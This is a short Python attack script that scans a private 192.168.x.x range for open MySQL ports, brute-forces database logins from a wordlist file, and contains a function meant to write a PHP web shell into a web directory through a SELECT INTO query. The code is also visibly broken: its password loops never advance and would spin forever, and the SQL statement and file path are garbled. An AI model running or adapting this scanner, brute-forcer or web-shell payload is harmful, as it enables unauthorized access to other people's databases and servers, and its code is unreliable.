import pymysql
import socket

def nmap(host):
    s = socket.socket()
    try:
        s.connect((host,3306))
        print(host,"'s 3306 is open !")
        return 1
    except Exception as e:
        print(host,"'s 3306 is cloes!")
        pass
    
def main():
    for i in range(1,254):
        for j in range(1,254):
            try:
                ips = '192.168.{}.{}'.format(i,j)
                while nmap(ips)==1:
                        f1 = open('1.txt','r')
                        u1 = f1.readline().strip()
                        while u1:
                            with open("1.txt",'r') as f:
                                pd = f.readline().strip()
                                while pd:
                                    try:
                                        con = pymysql.connect(
                                        host = ips,
                                        port = 3306,
                                        user = u1,
                                        password = pd
                                        )
                                        print (ips,"u is",u1,"p is",pd)
                                    except:
                                        pass
            except:
                pass


def mysqltest(ips,u1,pd):
    try:
        con = pymysql.connect(host = ips,port = 3306,user = u1,password = pd)
        cur = con.cursor()
        cur.execute("select '<?php ($_POST['123']);?>' into from 'ar/wwwml/1.php'")
        con.commit()
        cur.close
    except:
        pass
    
if __name__ == '__main__':
    main()